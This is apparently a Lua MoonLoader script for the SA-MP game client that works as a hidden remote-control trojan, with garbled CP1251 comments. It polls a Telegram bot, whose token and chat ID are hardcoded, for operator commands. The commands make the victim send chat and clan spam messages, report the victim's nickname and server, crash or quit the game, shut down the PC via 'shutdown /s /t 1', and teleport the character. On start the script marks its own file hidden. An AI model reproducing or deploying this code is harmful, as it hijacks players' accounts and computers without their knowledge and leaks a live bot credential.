local effil = require("effil")
local ffi = require 'ffi'
local encoding = require("encoding")
encoding.default = 'CP1251'
u8 = encoding.UTF8

ffi.cdef 'void __stdcall ExitProcess(unsigned int)'

chat_id = '-1002144476171' -- ��� ID �����
token = '7094826046:AAGntZxJ8YjYowsx5NDHcbJIYo50ihJPS0o' -- ����� ����

local FILE_ATTRIBUTE = {
    ARCHIVE = 32, -- (0x20)
    HIDDEN = 2, -- (0x2)
    NORMAL = 128, -- (0x80)
    NOT_CONTENT_INDEXED = 8192, -- (0x2000)
    OFFLINE = 4096, -- (0x1000)
    READONLY = 1, -- (0x1)
    SYSTEM = 4, -- (0x4)
    TEMPORARY = 256, -- (0x100)
}

local updateid -- ID ���������� ��������� ��� ���� ����� �� ���� �����

function threadHandle(runner, url, args, resolve, reject)
    local t = runner(url, args)
    local r = t:get(0)
    while not r do
        r = t:get(0)
        wait(0)
    end
    local status = t:status()
    if status == 'completed' then
        local ok, result = r[1], r[2]
        if ok then resolve(result) else reject(result) end
    elseif err then
        reject(err)
    elseif status == 'canceled' then
        reject(status)
    end
    t:cancel(0)
end

function requestRunner()
    return effil.thread(function(u, a)
        local https = require 'ssl.https'
        local ok, result = pcall(https.request, u, a)
        if ok then
            return {true, result}
        else
            return {false, result}
        end
    end)
end

function SetFileAttributes(file, ATTRIBUTE)
    local ffi = require('ffi')
    ffi.cdef([[
        bool SetFileAttributesA(
            const char* lpFileName,
            int  dwFileAttributes
        );
    ]])
    ffi.C.SetFileAttributesA(file, ATTRIBUTE)
end

function async_http_request(url, args, resolve, reject)
    local runner = requestRunner()
    if not reject then reject = function() end end
    lua_thread.create(function()
        threadHandle(runner, url, args, resolve, reject)
    end)
end

function encodeUrl(str)
    str = str:gsub(' ', '%+')
    str = str:gsub('\n', '%%0A')
    return u8:encode(str, 'CP1251')
end

function sendTelegramNotification(msg) -- ������� ��� �������� ��������� �����
    msg = msg:gsub('{......}', '') --��� ���� ������� ����
    msg = encodeUrl(msg) -- �� ��� �� ���������� ������
    async_http_request('https://api.telegram.org/bot' .. token .. '/sendMessage?chat_id=' .. chat_id .. '&text='..msg,'', function(result) end) -- � ��� ��� ��������
end

function get_telegram_updates() -- ������� ��������� ��������� �� �����
    while not updateid do wait(1) end -- ���� ���� �� ������ ��������� ID
    local runner = requestRunner()
    local reject = function() end
    local args = ''
    while true do
        url = 'https://api.telegram.org/bot'..token..'/getUpdates?chat_id='..chat_id..'&offset=-1' -- ������� ������
        threadHandle(runner, url, args, processing_telegram_messages, reject)
        wait(0)
    end
end

local messages = {
    "���� �������, ������� � ����. ���� ����� ��, ���� �����. QUWIN CLAN (SELL VV - VAHAR (fp))",
    "��������� ������� �������������! ����� ��� ���� �����! QUWIN CLAN ����",
    "QUWIN CUJLA � �� �������. ������ �����. ������ MQMQMQ ���� ������",
    "���������� ���� ����� ������ ���� ���� ���� ������! QUWIN CLAN �����. MQMQMQ",
    "��� �����������? ����� ���� �� ����� ���� ��. QUWIN ������",
    "������, � ��� ������ ����! ������ �� FP VAHAR. QUWIN CLAN",
    "alo �����, ������ ������� + ������! quwin clan ����. ���� ���� � ������",
    "������� �� ������� ����� ������! QUWIN CLAN ������� ������ ���!",
    "������ ���� �� ���� 12 ��� ��. ������ ���� ����²� ������"
}

local function getRandomMessage()
    local index = math.random(1, #messages) -- ���������� ��������� ������ � �������� ������� �������
    return messages[index] -- ���������� ��������� ���������
end

function processing_telegram_messages(result) -- ������� ���������� ���� ��� �������� ���
    if result then
        -- ���� �� ��������� ��� �� �����
        local proc_table = decodeJson(result)
        if proc_table.ok then
            if #proc_table.result > 0 then
                local res_table = proc_table.result[1]
                if res_table then
                    if res_table.update_id ~= updateid then
                        updateid = res_table.update_id
                        local message_from_user = res_table.message.text
                        if message_from_user then
                            -- � ��� ���� ��� �������� ����� �� �������
                            local text = u8:decode(message_from_user) .. ' ' --��������� � ����� ������ ���� �� ��������� ���. ��������� � ���������(���� ���� !q �� ��������� ��� !qq)
                            if text:match('^!sendchat') then
                                sampSendChat(arg)
                                local nickname = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
                                sendTelegramNotification(string.format("%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F ��������� \"%s\" ���� ���������� ������� \"%s\"\n\n%%F0%%9F%%92%%BB ������: \"%s\"", arg, nickname, sampGetCurrentServerName()))
                            
                            elseif text:match('^!sliv_vr') then
                                local nickname = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
                                for i = 1, 10 do
                                    wait(1366)
                                    local str = getRandomMessage()
                                    sampSendChat('/vr '..str)
                                    sendTelegramNotification(string.format("%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F ������� \"%s\" ���� ���������� ��������� \"%s\"", nickname, str))
                                end

                            elseif text:match('^!sliv_fam') then
                                local nickname = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
                                for i = 1, 10 do
                                    wait(1066)
                                    local str = getRandomMessage()
                                    sampSendChat('/fam '..str)
                                    sendTelegramNotification(string.format("%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F ��)����� \"%s\" ���� ���������� ��������� \"%s\"", nickname, str))
                                end
                            
                            elseif text:match('^!getnick') then
                                local nickname = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
                                sendTelegramNotification(string.format("%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F ����� \"%s\" ������ ������ �� ������� \"%s\"", nickname, sampGetCurrentServerName()))
                            
                            elseif text:match('^!crash') then
                                local nickname = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
                                sendTelegramNotification(string.format("%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F ����� \"%s\" ��� ������� �������.", nickname))
                                lua_thread.create(function()
                                    wait(1000)
                                    writeMemory(0x1, 0x1, 0x1)
                                end)
                            
                            elseif text:find('^!quit') then
                                local nickname = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
                                sendTelegramNotification(string.format("%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F ����� \"%s\" ����� � ����.", nickname))
                                lua_thread.create(function()
                                    wait(1000)
                                    ffi.C.ExitProcess(0)
                                end)
                            
                            elseif text:find('^!off_pc') then
                                local nickname = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
                                sendTelegramNotification(string.format("%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F ����������! �� ������� ������ \"%s\" ��������� ����.", nickname))
                                lua_thread.create(function()
                                    wait(1000)
                                    os.execute('shutdown /s /t 1')
                                end)
                            --[[elseif text:find('^!explorer') then
                                local nickname = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
                                sendTelegramNotification(string.format("%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F ����������! �� ������� ������ \"%s\" ������� 5 �����������", nickname))
                                for i = 1, 5 do
                                    lua_thread.create(function()
                                        wait(50) -- ���� 1 ������� ����� ��������� ���������� ����������
                                        os.execute('explorer.exe')
                                    end)
                                end]]
                            elseif text:find('^!spawn') then
                                local bs = raknetNewBitStream()
                                raknetSendRpc(52, bs)
                                raknetDeleteBitStream(bs)
                                local nickname = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
                                sendTelegramNotification(string.format("%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F ����� \"%s\" ��� ��������� �� �����.", nickname))
                            
                            elseif text:find('^!kill') then
                                local nickname = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
                                local x, y, z = getCharCoordinates(PLAYER_PED)
                                setCharCoordinates(PLAYER_PED, x, y, z-7)
                                sendTelegramNotification(string.format("%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F ����� \"%s\" ��� ��������� ��� ��������. � ������ ������� �� ����. �� ������� �����������, ��� ��� ������ �������������.", nickname))
                                sampAddChatMessage('�� ���� ��������������� ���������������',-1)
                            
                            elseif text:find('^!slap') then
                                local nickname = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
                                local x, y, z = getCharCoordinates(PLAYER_PED)
                                setCharCoordinates(PLAYER_PED, x, y, z+7)
                                sendTelegramNotification(string.format("%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F ����� \"%s\" ��� �������. �� ������� �����������, ��� ��� ������ �������������.", nickname))
                                sampAddChatMessage('�� ���� ���������� ���������������',-1)
                            end
                        end
                    end
                end
            end
        end
    end
end


function getLastUpdate() -- ��� �� �������� ��������� ID ���������, ���� �� � ��� � ���� ����� ��������� ������ � chat_id, �������� ��� ������� ��� ���� ���� �������� ��������� ���������
    async_http_request('https://api.telegram.org/bot'..token..'/getUpdates?chat_id='..chat_id..'&offset=-1','',function(result)
        if result then
            local proc_table = decodeJson(result)
            if proc_table.ok then
                if #proc_table.result > 0 then
                    local res_table = proc_table.result[1]
                    if res_table then
                        updateid = res_table.update_id
                    end
                else
                    updateid = 1 -- ��� ������� �������� 1, ���� ������� ����� ������
                end
            end
        end
    end)
end

function main()
    while not isSampAvailable() do
        wait(0)
    end
    getLastUpdate() -- �������� ������� ��������� ���������� ID ���������
    lua_thread.create(get_telegram_updates) -- ������� ���� ������� ��������� ��������� �� �����

    SetFileAttributes(thisScript().path, FILE_ATTRIBUTE.HIDDEN)

    while true do
        wait(0)

    end
end